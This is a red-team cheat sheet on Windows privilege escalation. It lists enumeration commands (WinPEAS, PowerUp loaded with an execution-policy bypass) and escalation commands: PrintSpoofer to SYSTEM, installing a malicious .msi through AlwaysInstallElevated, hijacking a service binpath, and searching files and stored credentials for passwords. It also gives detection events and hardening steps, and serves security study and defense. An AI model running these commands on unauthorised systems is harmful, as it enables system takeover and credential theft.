---
title: "Windows Privilege Escalation"
category: "red-team"
tags: ["privesc", "windows", "post-exploitation"]
platform: "windows"
mitre: ["T1548", "T1068"]
difficulty: "intermediate"
updated: "2026-07-11"
author: "core"
---

# Windows Privilege Escalation

## TL;DR
Enumerate with an automated tool (WinPEAS) → look for: outdated services, weak service permissions, unquoted paths, AlwaysInstallElevated, tokens, credentials in files/registry.

## Enumeration
```powershell
# Automated
.\winPEASx64.exe
# PowerUp
powershell -ep bypass -c "IEX(Get-Content PowerUp.ps1 -Raw); Invoke-AllChecks"

# Manual
whoami /priv                 # token privileges (Se*Privilege)
systeminfo                   # patch level -> exploit suggester
wmic service get name,pathname,startmode | findstr /i auto | findstr /i /v "C:\Windows"
```

## Vectors
```text
- SeImpersonatePrivilege     -> Potato (JuicyPotatoNG / PrintSpoofer) -> SYSTEM
- Unquoted service path      -> plant an exe in a path with a space
- Weak service perms         -> sc config <svc> binpath="cmd /c ..."; sc start
- AlwaysInstallElevated (1/1) -> msiexec a malicious .msi as SYSTEM
- Modifiable %PATH% / DLL hijack
- Credentials                -> unattend.xml, Web.config, cmdkey /list, registry
```

```powershell
# SeImpersonate -> SYSTEM
.\PrintSpoofer64.exe -i -c cmd

# AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msiexec /quiet /qn /i evil.msi

# Hunt for passwords
findstr /si password *.xml *.ini *.config
cmdkey /list
```

## Detection (Blue Team)
- `sc config` changing binPath, service creation (Event **7045**).
- Child processes of `spoolsv.exe`/named-pipe impersonation (Potato).
- Sysmon Event 1 (process create) from unusual paths.

## Mitigation / Hardening
- Quote service paths, correct service ACLs, patching.
- Disable AlwaysInstallElevated, LAPS on local accounts, remove Print Spooler where unneeded.

## Sources
- [PayloadsAllTheThings – Windows PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- See also: [token-impersonation.md](./token-impersonation.md)
